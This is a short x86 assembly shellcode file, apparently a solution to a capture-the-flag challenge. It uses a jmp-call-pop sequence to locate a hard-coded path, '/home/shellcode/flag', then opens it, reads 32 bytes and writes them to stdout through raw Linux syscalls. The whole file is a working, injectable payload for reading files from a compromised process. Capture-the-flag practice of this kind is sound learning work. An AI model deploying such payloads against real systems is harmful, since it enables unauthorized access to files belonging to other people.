section .text
global _start
_start:
    jmp path
open:
; open(path, 0 , 0)
    xor eax, eax
    mov ebx, [esp]
    mov ecx, eax
    mov edx, eax
    mov al, 0x5
    int 0x80
read:
; read(fd, esp, 32)
    mov ebx, eax
    mov al, 0x3
    mov ecx, esp
    mov dl, 0x20
    int 0x80
write:
; write(1, esp, 32)
    mov al, 0x4
    mov bl, 0x1
    int 0x80
    jmp end

path:
    call open
    db "/home/shellcode/flag", 0

end:
    xor ebx, ebx
    mov al, 0x1
    int 0x80
